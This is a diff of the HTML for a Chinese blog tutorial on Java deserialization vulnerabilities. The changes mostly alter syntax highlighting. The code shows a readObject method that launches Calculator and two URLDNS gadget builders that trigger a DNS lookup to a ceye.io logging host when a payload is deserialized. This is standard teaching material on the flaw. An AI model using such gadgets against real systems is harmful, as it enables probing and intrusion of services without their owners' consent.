@@ -211,7 +211,7 @@
     <h1 class="post-title">
       Java反序列化漏洞(一) 前置知识&amp;URLDNS
     </h1>
-    <div class="post-meta"><span title='2022-10-24 15:47:17 +0800 +0800'>2022-10-24</span>&nbsp;·&nbsp;11 分钟&nbsp;·&nbsp;Reus09
+    <div class="post-meta">&lt;span title=&#39;2022-10-24 15:47:17 &#43;0800 &#43;0800&#39;&gt;2022-10-24&lt;/span&gt;&amp;nbsp;·&amp;nbsp;11 分钟&amp;nbsp;·&amp;nbsp;Reus09
 
 </div>
   </header> <aside id="toc-container" class="toc-container wide">
@@ -433,9 +433,9 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> Basic<span style="color:#f92672">;</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> Basic;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @ClassName Person
@@ -444,38 +444,38 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Date 2022/10/23 15:15
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Version 1.0
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> **/</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Person</span> <span style="color:#66d9ef">implements</span> Serializable <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Person</span> <span style="color:#66d9ef">implements</span> Serializable {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String name<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String name;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">int</span> age<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">int</span> age;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">Person</span><span style="color:#f92672">(</span>String name<span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span> age<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> name<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">age</span> <span style="color:#f92672">=</span> age<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">Person</span>(String name, <span style="color:#66d9ef">int</span> age) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> name;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">age</span> <span style="color:#f92672">=</span> age;
+</span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span><span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ObjectInputStream</span> in<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> ClassNotFoundException <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>        Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;open -a Calculator.app&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectInputStream</span> in) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;open -a Calculator.app&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>		
 </span></span><span style="display:flex;"><span>  
 </span></span><span style="display:flex;"><span>  
 </span></span><span style="display:flex;"><span>  	
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> ClassNotFoundException <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>        Person person <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Person<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;reus09&#34;</span><span style="color:#f92672">,</span> <span style="color:#ae81ff">21</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>        Person person <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Person(<span style="color:#e6db74">&#34;reus09&#34;</span>, 21);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileOutputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;abc.txt&#34;</span><span style="color:#f92672">));</span>
-</span></span><span style="display:flex;"><span>        oos<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>person<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        oos<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;abc.txt&#34;</span>));
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(person);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">close</span>();
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        FileInputStream   fis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;abc.txt&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream<span style="color:#f92672">(</span>fis<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        ois<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>        ois<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        FileInputStream   fis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">&#34;abc.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(fis);
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024162723342.png" alt="image-20221024162723342"  />
@@ -577,25 +577,25 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS</span> <span style="color:#f92672">{</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS</span> {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		HashMap<span style="color:#f92672">&lt;</span>URL<span style="color:#f92672">,</span> Integer<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;();</span>
-</span></span><span style="display:flex;"><span>		URL                   url     <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://reus09.zmz0xr.ceye.io&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		Field                 f       <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.net.URL&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;hashCode&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		HashMap<span style="color:#f92672">&lt;</span>URL, Integer<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>		URL                   url     <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://reus09.zmz0xr.ceye.io&#34;</span>);
+</span></span><span style="display:flex;"><span>		Field                 f       <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.net.URL&#34;</span>).<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;hashCode&#34;</span>);
+</span></span><span style="display:flex;"><span>		f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>url<span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span>x01010101<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		hashMap<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>url<span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>url<span style="color:#f92672">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		f.<span style="color:#a6e22e">set</span>(url, 0x01010101);
+</span></span><span style="display:flex;"><span>		hashMap.<span style="color:#a6e22e">put</span>(url, 0);
+</span></span><span style="display:flex;"><span>		f.<span style="color:#a6e22e">set</span>(url, <span style="color:#f92672">-</span>1);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileOutputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;urldns.bin&#34;</span><span style="color:#f92672">));</span>
-</span></span><span style="display:flex;"><span>		oos<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>hashMap<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileInputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;urldns.bin&#34;</span><span style="color:#f92672">));</span>
-</span></span><span style="display:flex;"><span>		ois<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>		ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;urldns.bin&#34;</span>));
+</span></span><span style="display:flex;"><span>		oos.<span style="color:#a6e22e">writeObject</span>(hashMap);
+</span></span><span style="display:flex;"><span>		ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">&#34;urldns.bin&#34;</span>));
+</span></span><span style="display:flex;"><span>		ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>第二种思路的代码实现：</p>
@@ -624,27 +624,27 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS2</span> <span style="color:#f92672">{</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS2</span> {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		HashMap<span style="color:#f92672">&lt;</span>URL<span style="color:#f92672">,</span> Integer<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;();</span>
-</span></span><span style="display:flex;"><span>		URL                   url     <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://reus09.zmz0xr.ceye.io&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		HashMap<span style="color:#f92672">&lt;</span>URL, Integer<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>		URL                   url     <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://reus09.zmz0xr.ceye.io&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		Method<span style="color:#f92672">[]</span> m <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.util.HashMap&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredMethods</span><span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>Method method <span style="color:#f92672">:</span> m<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>method<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">().</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;putVal&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>				method<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>				method<span style="color:#f92672">.</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span>hashMap<span style="color:#f92672">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">,</span> url<span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>			<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>		Method<span style="color:#f92672">[]</span> m <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.util.HashMap&#34;</span>).<span style="color:#a6e22e">getDeclaredMethods</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (Method method : m) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (method.<span style="color:#a6e22e">getName</span>().<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;putVal&#34;</span>)) {
+</span></span><span style="display:flex;"><span>				method.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>				method.<span style="color:#a6e22e">invoke</span>(hashMap, <span style="color:#f92672">-</span>1, url, 0, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileOutputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;urldns2.bin&#34;</span><span style="color:#f92672">));</span>
-</span></span><span style="display:flex;"><span>		oos<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>hashMap<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>		ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileInputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;urldns2.bin&#34;</span><span style="color:#f92672">));</span>
-</span></span><span style="display:flex;"><span>		ois<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>		ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;urldns2.bin&#34;</span>));
+</span></span><span style="display:flex;"><span>		oos.<span style="color:#a6e22e">writeObject</span>(hashMap);
+</span></span><span style="display:flex;"><span>		ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">&#34;urldns2.bin&#34;</span>));
+</span></span><span style="display:flex;"><span>		ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>根据<code>ceye</code>提供的一个<code>dnslog</code>平台，我们可以验证是可以成功触发<code>DNS</code>解析的</p>
